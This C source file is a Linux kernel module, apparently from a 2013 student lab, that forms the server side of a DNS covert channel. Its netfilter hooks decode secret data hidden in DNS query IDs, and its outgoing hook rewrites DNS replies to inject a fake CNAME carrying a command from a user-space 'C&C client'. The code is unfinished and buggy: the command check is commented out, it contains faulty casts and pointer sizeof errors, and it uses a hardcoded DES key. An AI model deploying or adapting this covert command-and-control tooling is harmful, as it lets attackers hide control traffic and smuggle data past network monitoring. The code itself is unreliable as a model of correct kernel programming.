/*
 * onlab-kernel-srv.c
 *
 * Kernel module for dns covert channel  / server side
 * This module should be loaded on the controlled host, which has the recursive dns
 *
 * Copyright (C) 2013 by Tamas Varga
 *
 */
#undef __KERNEL__
#define __KERNEL__

#undef MODULE
#define MODULE
/* kernel */
#include <linux/module.h> 
#include <linux/kernel.h>
#include <linux/init.h>
#include <net/ip.h>
#include <linux/ip.h>
#include <linux/skbuff.h>
#include <linux/udp.h>
#include <linux/in.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/etherdevice.h>
#include <linux/list.h>
#include "dnscc.h"
#include "messages/dnscc_msg.h"
#include "messages/get_file_msg.h"
/* */
/* Def */
#define UDP_HDR_LEN 8
#define DNS_PORT 53
#define NETLINK_USER 31
/* statics */
static struct nf_hook_ops nfho_send,nfho_recv;
struct DNS_HEADER {
	uint16_t	query_id;
	uint16_t	flags;
	uint16_t	qdcount;
	uint16_t	ancount;
	uint16_t	nscount;
	uint16_t	arcount;
};
struct DNS_QUERY {
	unsigned char 	*name;
	struct QUESTION	*ques;
};
struct QUESTION
{
	uint16_t	qtype;
	uint16_t	qclass;
};
struct RR
{
	unsigned char 	*name;
	struct RR_DATA	*rr_data;
	unsigned char	*rdata;
};

struct RR_DATA{
	uint16_t	type;
	uint16_t	class;
	uint32_t	ttl;
	uint16_t	rdlength;
};

/* List for filtering outgoing dns reply packets */ 
/* Sending command with the cli client
 * 1, CLI sends a netlink message to kernel module
 * 2, Validate message, and make a connection enrty in conn_out_list
 * 3, Every outgoing dns client response will be matched against conn_out_list
 * 4, After match found, the original packet will be replaced with a fake CNAME dns reply
 * 5, Client will query that fake CNAME, then we send out the original reply
 */
struct conn_out_data{
	uint32_t ip_addr;
	uint16_t stage;//see #define
	struct sk_buff *orig_skb;
	struct list_head list;
};

struct conn_out_data conn_out_list;

/* Struct for identifying a connection in the linked list */
struct conn_in_data{
	uint32_t ip_addr;
	uint32_t connection_id;
	struct list_head list;
};

struct conn_in_data conn_in_list;

/* Netlink socket for communication between this module and the user space C&C client */

struct sock *nl_sk = NULL;

/* Our netlink function */
static void dnscc_nl_recv_msg(struct sk_buff *skb){
	struct nlmsghdr *nlh;
	int pid;
	struct sk_buff *skb_out;
	int msg_size;
	int res;
	dnscc_msg* msg;
	/* decode received message */
	nlh = (struct nlmsghdr *)skb->data;
	msg = (dnscc_msg*) nlmsg_data(nlh);
	switch(msg->type){
		case 1: {
				struct conn_out_data* c;
				get_file_msg* gfmsg = msg->data;
				printk(KERN_INFO "[DNSCC] Netlink get file message IP: %pI4 Remote File: %s ", &gfmsg->ip, gfmsg->remote_file);
				c = kmalloc(sizeof(*c), GFP_DMA);
				c->ip_addr = gfmsg->ip.s_addr;
				INIT_LIST_HEAD(&c->list);
				list_add(&c->list,&conn_out_list.list);
				break;
			}
		default:
			printk(KERN_INFO "[DNSCC] Netlink message, unknown type %d ", msg->type);
			break;
	}
}

/* Connection helpers */
/* Generate an unique connection identifier using the source IP, and the source port
 * and store it in the connection_list 
 * TODO: is there any chance of generating NULL as unique id?
 */
uint32_t generate_connection_id(uint32_t ip_addr, uint16_t sport){
	struct conn_in_data* c;
	printk(KERN_DEBUG "[DNSCC] Generating new connection id");
	c = kmalloc(sizeof(*c), GFP_DMA);
	c->ip_addr = ip_addr;
	c->connection_id = ip_addr ^ sport;
	INIT_LIST_HEAD(&c->list);
	list_add(&c->list,&conn_in_list.list);
	return c->connection_id;
}


/* Check the linked list, and return the connection identifier 
 * If not exists, then return 0
 * */
uint32_t check_connection_exists(uint32_t ip_addr){
	uint32_t ret;
	struct conn_in_data* c;
	ret = 0;
	list_for_each_entry(c,&conn_in_list.list,list){
		if(c->ip_addr == ip_addr){
			printk(KERN_DEBUG "[DNSCC] Match found! Connection id: %u", c->connection_id);
			ret = c->connection_id;
		}
	}
	return ret;
}

/* Remove the connection from linked list and return the connection id*/
uint32_t remove_connection(uint32_t ip_addr){
	uint32_t ret;
	struct conn_in_data *c,*temp;
	ret = 0;
	list_for_each_entry_safe(c,temp,&conn_in_list.list,list){
		if(c->ip_addr == ip_addr){
			ret = c->connection_id;
			list_del(&c->list);
			kfree(c);
			printk(KERN_DEBUG "[DNSCC] Match found, connection removed from list! Connection id: %u", ret);
		}
	}
	return ret;


}

/* Out conn helpers */
/* Check if we need to send command to this ip 
 * if yes, return 1, else 0
 * */
uint16_t check_command_exists(uint32_t ip_addr){
	uint16_t ret;
	struct conn_out_data* c;
	ret = 0;
	list_for_each_entry(c,&conn_out_list.list,list){
		if(c->ip_addr == ip_addr){
			printk(KERN_DEBUG "[DNSCC] Match found! Command for %pI4",&ip_addr);
			ret = 1;
		}
	
	}
	return ret;
}


//TODO:Removeme static const uint16_t port = 53;
unsigned char* read_dns_name(unsigned char* reader, unsigned char* buffer, int* count)
{
	unsigned char *name;
	unsigned int p=0,jumped=0,offset;
	int i , j;
	*count = 0;
	name = (unsigned char*)kmalloc(256,GFP_DMA);
	name[0]='\0';
	//read the names in 3www6google3com format
	while(*reader!=0)
	{
		if(*reader>=192)
		{
			offset = (*reader)*256 + *(reader+1) - 49152; //49152 = 11000000 00000000 ;)
			reader = buffer + offset - 1;
			jumped = 1; //we have jumped to another location so counting wont go up!
		}else{
			name[p++]=*reader;
		}
		reader = reader+1;
		if(jumped==0){
			*count = *count + 1; //if we havent jumped to another location then we can count up
		}
	}
	name[p]='\0'; //string complete
	if(jumped==1)
	{
		*count = *count + 1; //number of steps we actually moved forward in the packet
	}
	//now convert 3www6google3com0 to www.google.com
	for(i=0;i<(int)strlen((const char*)name);i++){
		p=name[i];
		for(j=0;j<(int)p;j++){
			name[i]=name[i+1];
			i=i+1;
		}
		name[i]='.';
	}
	name[i-1]='\0'; //remove the last dot
	printk(KERN_INFO"read_dns_name: %s %d",name,*count);
	return name;
}

uint16_t manipulate_dns_reply(unsigned char* data, unsigned char* command, unsigned char* new_dns_data){
	struct DNS_HEADER *dns_h,*ndns_h;
	unsigned char *qname, *nqname;
	unsigned char* dns_name;
	unsigned char *dpointer;
        struct RR ar[10],*new_ar;
	int temp;  // domain name reader temp var
	int dnsn_count;//question dns name count
	int i,j;
	uint16_t orig_ar_size = 0;

	temp =0;
	dns_h =	(struct DNS_HEADER*)data;
	dns_name = read_dns_name(&data[sizeof(struct DNS_HEADER)],data,&dnsn_count); 
	qname =(unsigned char*)&data[sizeof(struct DNS_HEADER)];

        dpointer = &data[sizeof(struct DNS_HEADER) + (strlen((const char*)qname)+1) + sizeof(struct QUESTION)];
	/* read answers */
	/* parse the answer RRs */
	printk(KERN_INFO "[DNSCC] Modify dns packet - dns ans count: %d", ntohs(dns_h->ancount));
	for(i=0;i<ntohs(dns_h->ancount);i++){
		printk(KERN_INFO "[DNSCC] AR %d Orig_ar_size: %d",i,orig_ar_size);
		ar[i].name = read_dns_name(dpointer,data,&temp);
		printk(KERN_INFO "[DNSCC] TEMP: %d",temp);
		printk(KERN_INFO "%x %x %x %x",dpointer[0],dpointer[1],dpointer[2],dpointer[3]);
//		orig_ar_size = orig_ar_size + temp;
		dpointer = dpointer + temp;//move reader to the end of the name 
		printk(KERN_INFO "%x %x %x %x",dpointer[0],dpointer[1],dpointer[2],dpointer[3]);
		ar[i].rr_data = (struct RR_DATA*)(dpointer);
		orig_ar_size = orig_ar_size + sizeof(struct RR_DATA);
		dpointer = dpointer + sizeof(struct RR_DATA);
		//parse rdata
		//ipv4 or name
		//TODO:removeme
		printk(KERN_INFO "%x %x %x %x",dpointer[0],dpointer[1]);
		printk(KERN_INFO "%d %d %d %d",ntohs(ar[i].rr_data->type),ntohs(ar[i].rr_data->rdlength),ntohs(ar[i].rr_data->class),ntohs(ar[i].rr_data->ttl));
		orig_ar_size = orig_ar_size + ntohs(ar[i].rr_data->rdlength);
//		dpointer = dpointer + ntohs(ar[i].rr_data->rdlength);

		if(ntohs(ar[i].rr_data->type) == 1) //ipv4
		{
			ar[i].rdata = (unsigned char)kmalloc(ntohs(ar[i].rr_data->rdlength),GFP_DMA);
			for(j=0;j<ntohs(ar[i].rr_data->rdlength);j++){
				ar[i].rdata[j]=dpointer[j];
				printk(KERN_INFO" %d -> %x ",j,ar[i].rdata[j]);	
			}
			ar[i].rdata[ntohs(ar[i].rr_data->rdlength)] = '\0';
			orig_ar_size += ntohs(ar[i].rr_data->rdlength);
			dpointer += ntohs(ar[i].rr_data->rdlength);
			u_int32_t ip = (u_int32_t)ar[i].rdata;
			printk(KERN_INFO "[DNSCC] Modify dns packet - found answer: %s ->IP: %pI4",ar[i].name,&ip);
		printk(KERN_INFO"TEST");
		}
		else // should be a name
		{
			temp = 0;
			ar[i].rdata = read_dns_name(dpointer,data,&temp);
			printk(KERN_INFO" temp %d ",temp);
			dpointer = dpointer + temp;
//			printk(KERN_INFO "[DNSCC] Modify dns packet - found answer: %s -> CNAME %s",ar[i].name,ar[i].rdata);
	
		}
	}

	//dpointer--; // Don't know why should i decrement, but it's working :)

	printk(KERN_INFO "2 bit %x %x %d",dpointer[0],dpointer[1],orig_ar_size);

	unsigned long writer = 0;
	/* Create fake answer rr record */
	unsigned char orig_ans[8] = "0hu2aaa3";
	struct RR fake_rr;
	int com_len = strlen(command)+1;
	fake_rr.name = kmalloc(sizeof(unsigned char)*2,GFP_DMA);
	fake_rr.name[0] = 0xc0;
	fake_rr.name[1] = 0x0c;
	//memcpy(fake_rr.name,&command,sizeof(unsigned char)*2);
	printk(KERN_INFO"fake comm %x - %x",ntohs(fake_rr.name[0]),ntohs(fake_rr.name[1]));
	fake_rr.rr_data = kmalloc(sizeof(struct RR_DATA),GFP_DMA);
	fake_rr.rr_data->type = htons(5);//cname
	fake_rr.rr_data->class = htons(1);
	fake_rr.rr_data->ttl = htons(1);
	fake_rr.rr_data->rdlength = htons(com_len);
	fake_rr.rdata = command;
	/* put together the new dns packet */
	/* header */
	ndns_h = (struct DNS_HEADER *)new_dns_data;
	*ndns_h = *dns_h;			// use the old header
	writer += sizeof(struct DNS_HEADER);
	ndns_h->ancount = htons(1);
	/* qname */
	nqname = (unsigned char *)&new_dns_data[writer];
	memcpy(nqname,qname,strlen((const char*)qname)+1+sizeof(struct QUESTION));	//use the original qname + question flags
	writer += strlen((const char*)qname)+1+sizeof(struct QUESTION);
	/* answer */
	new_ar = (unsigned char *)&new_dns_data[writer];
	memcpy(new_ar,fake_rr.name,sizeof(unsigned char)*2);//first answer here, so inject our fake cname
	printk(KERN_INFO"new ar %x %x",new_dns_data[writer],new_dns_data[writer+1]);
	writer += sizeof(unsigned char)*2;
	memcpy(&new_dns_data[writer],fake_rr.rr_data,sizeof(struct RR_DATA));
	writer += sizeof(struct RR_DATA)-2;
	memcpy(&new_dns_data[writer],command,strlen((const char*)command)+1);
	writer += strlen((const char*)command)+1;
	

	/* */
	printk(KERN_INFO"[DNSCC] Manipulated answer size : %d",writer);
	return writer;	
}


/*Receiver hook */
static unsigned int dnscc_recv(unsigned int hooknum, struct sk_buff* skb, const struct net_device* in, const struct net_device* out, int (*okfn)(struct sk_buff*)) {
	struct iphdr* iph = ip_hdr(skb);
	struct udphdr* udph = NULL, udpbuff;
	unsigned char *data = NULL,*dns_name;
	struct DNS_HEADER* dns_h = NULL;	/* if it's not udp, then return accept*/
	bool query_bit = false;
	int dnsn_count = 0;
	uint16_t d_id; // dns_id
	uint8_t action = 5;// dns_action. 5 because, it's invalid by default
	uint8_t secret_data;
	uint32_t connection_id;
	/* parse dns packet */
	/* check if the packet is valid */
	/* parse IP header */
	if(iph->protocol != IPPROTO_UDP){
		return NF_ACCEPT;
	}
	/* udp header*/
	udph = skb_header_pointer(skb, ip_hdrlen(skb), sizeof(*udph) ,&udpbuff);
	if (!udph){
		return NF_ACCEPT;
	}
	/* We're receiving a question, so dst should be 53 */
	if(ntohs(udph->dest) != DNS_PORT){
		return NF_ACCEPT;
	}
	/* get dns packet */
	data = (unsigned char *) skb_header_pointer (skb, ip_hdrlen(skb)+UDP_HDR_LEN, 0, NULL);
	/* Better way? */
	dns_h = (struct DNS_HEADER*)data;	
	query_bit = (ntohs(dns_h->flags) & 0x8000) >> 15;
	/* DST port == DNS_PORT and dst mac == our mac address */
	if (!query_bit ) {
		dns_name = read_dns_name(&data[sizeof(struct DNS_HEADER)],data,&dnsn_count);
		d_id = dnscc_decrypt(ntohs(dns_h->query_id),iph,udph);
		printk(KERN_DEBUG "[DNSCC] Incoming DNS query packet id %u dns-name %s answer = %d \n",ntohs(dns_h->query_id),dns_name,query_bit);
		action = dnscc_get_action(d_id);
		secret_data = dnscc_get_data(d_id);
		/* Check if it's starting packet, or we already have a connection */
		connection_id = 0;
		if(action == 1){ // new connection
			connection_id = generate_connection_id(iph->saddr,ntohs(udph->source));
			printk(KERN_INFO "[DNSCC] New connection id generated %u",connection_id);
		}else if(action == 2){ // find the connection_id
			connection_id = check_connection_exists(iph->saddr);
		}else if(action == 3){// this is the last segment, remove the connection id
			connection_id = remove_connection(iph->saddr);
		}else{
			printk(KERN_INFO "[DNSCC] Invalid action id: %u", action);
		}
		printk(KERN_INFO "[DNSCC][DATA] %u  %u  %u ",connection_id,action,secret_data);
		kfree(dns_name);
	}

	return NF_ACCEPT;
}


/* Sender hook */
static unsigned int dnscc_send(unsigned int hooknum, struct sk_buff* skb, const struct net_device* on, const struct net_device* out, int (*okfn)(struct sk_buff*)) {
	struct ethhdr *eth;
	struct iphdr* iph = ip_hdr(skb);
	struct udphdr* udph = NULL, udpbuff;
	unsigned char *data = NULL,*dns_name;
	struct DNS_HEADER* dns_h = NULL;	/* if it's not udp, then return accept*/
	bool query_bit = false;
	int dnsn_count = 0;
	/* check if the packet is valid */
	/* parse IP header */
	if(iph->protocol != IPPROTO_UDP){
		return NF_ACCEPT;
	}
	/* udp header*/
	//udph = skb_header_pointer(skb, ip_hdrlen(skb), sizeof(*udph) ,&udpbuff);
	udph = udp_hdr(skb);
	if (!udph){
		return NF_ACCEPT;
	}
	/* We're sending an asnwer, so src should be 53 */
	if(ntohs(udph->source) != DNS_PORT){
		return NF_ACCEPT;
	}
	/* get dns packet */
	data = (unsigned char *) skb_header_pointer (skb, ip_hdrlen(skb)+UDP_HDR_LEN, 0, NULL);
	/* Better way? */
	dns_h = (struct DNS_HEADER*)data;	
	query_bit = (ntohs(dns_h->flags) & 0x8000) >> 15;
	/* SRC port == DNS_PORT and src mac == our mac address */
	if(query_bit ){
		dns_name = read_dns_name(&data[sizeof(struct DNS_HEADER)],data,&dnsn_count); 
		printk(KERN_INFO "[DNSCC] Outgoing DNS answer packet id %u dns-name %s answer = %d \n",ntohs(dns_h->query_id),dns_name,query_bit);
		/* check if we need to send out a command to this client*/
	//	if(check_command_exists(iph->daddr) == 1){
			printk(KERN_INFO "[DNSCC] C&C command found for %pI4 replacing original DNS reply",&iph->daddr);
			/* Manipulate the answer */
			unsigned char *command = "\3get\4elte\3com\0";
//	command[0] = (uint16_t)3;
//	command[4] = (uint16_t)0;
			unsigned char *orig_dns_data;
			unsigned char *new_dns_data;
			uint16_t new_dns_size;
			uint16_t payload_len = ntohs(udph->len) - UDP_HDR_LEN;
			new_dns_size = sizeof(unsigned char)*payload_len + sizeof(command);
			new_dns_data = kmalloc(new_dns_size,GFP_DMA);
			printk(KERN_INFO "1new dns size: %d ",new_dns_size);
			orig_dns_data = kmalloc(sizeof(unsigned char)*payload_len,GFP_DMA);
			skb_copy_bits(skb,skb->len - payload_len,orig_dns_data,payload_len); // copy data from skb
			/* new skb */
//			struct sk_buff* skb_new;
//			skb_new = skb_copy_expand(skb,0,sizeof(new_dns_data),GFP_ATOMIC);
	
			//memcpy(orig_dns_data,skb->data,skb->data_len);
			//skb_trim(skb,skb->len - skb->data_len); //remove the original dns payload
			printk(KERN_INFO "SKB DATA LEN %d",payload_len);
			new_dns_size = manipulate_dns_reply(orig_dns_data,command,new_dns_data);
			memcpy(data,new_dns_data,new_dns_size);
			skb->len = skb->len - (payload_len) + new_dns_size;
			printk(KERN_INFO "2new dns size: %d ",new_dns_size);

//			data = skb_put(skb_new,sizeof(new_dns_data));
//			int copy = skb_tailroom(skb_new);
			printk(KERN_INFO"new dns data size: %i",sizeof(new_dns_data));
//			skb_add_data(skb_new,&new_dns_data,copy);
//			kfree_skb(skb);
//			skb = skb_new;
		//		return NF_STOLEN;
	//	}
		kfree(dns_name);
		}
	return NF_ACCEPT;
}



/* Load and unload */
static __init int my_init(void){
	int cipher = 1;
	char des_key[8+1]="AAAAAAAA";
	/* create the netlink socket */
	nl_sk = netlink_kernel_create(&init_net, NETLINK_USER, 0, dnscc_nl_recv_msg, NULL, THIS_MODULE);
	if(!nl_sk){
		printk(KERN_ALERT "[DNSCC] Error while creating netlink socket");
	}else{
		printk(KERN_DEBUG "[DNSCC] Netlink socket created");
	}
	/* cipher things */
	dnscc_crypt_init(cipher,des_key);
	nfho_send.hook 	= dnscc_send; 					//function to call
	nfho_send.hooknum 	= NF_INET_LOCAL_OUT;			//hook num in netfilter TODO: What if the packet is fragmented?
	nfho_send.pf		= NFPROTO_IPV4;				//IPV4
	nfho_send.priority	= NF_IP_PRI_FIRST;			//should be first priority
	nf_register_hook(&nfho_send);					//register netfilter hook
	printk(KERN_INFO "[DNSCC] dnscc_send kernel module loaded\n");
	nfho_recv.hook 	= dnscc_recv; 					//function to call
	nfho_recv.hooknum 	= NF_INET_PRE_ROUTING;			//hook num in netfilter TODO: What if the packet is fragmented?
	nfho_recv.pf		= NFPROTO_IPV4;				//IPV4
	nfho_recv.priority	= NF_IP_PRI_FIRST;			//should be first priority
	nf_register_hook(&nfho_recv);					//register netfilter hook
	printk(KERN_INFO "[DNSCC] dnscc_recv kernel module loaded\n");
	/* Create llist for identifying incoming connections */
	INIT_LIST_HEAD(&conn_in_list.list);
	INIT_LIST_HEAD(&conn_out_list.list);

	return 0;
}

static __exit void my_exit(void){
	struct conn_in_data *cin;
	struct conn_out_data *cout;
	struct conn_in_data *tmpin;
	struct conn_out_data *tmpout;
	/* release netlink socket */
	netlink_kernel_release(nl_sk);
	nf_unregister_hook(&nfho_send);				//unregister netfilter hook
	printk(KERN_INFO "[DNSCC] dnscc_send kernel module unloaded\n");
	nf_unregister_hook(&nfho_recv);				//unregister netfilter hook
	printk(KERN_INFO "[DNSCC] dnscc_recv kernel module unloaded\n");
	/* Remove all elements from conn_list */
	list_for_each_entry_safe(cin,tmpin,&conn_in_list.list, list){
		printk(KERN_DEBUG "[DNSCC] freeing node %u\n", cin->connection_id);
		list_del(&cin->list);
		kfree(cin);
	}
	list_for_each_entry_safe(cout,tmpout,&conn_out_list.list, list){
		list_del(&cout->list);
		kfree(cout);
	}
}

module_init(my_init);
module_exit(my_exit);
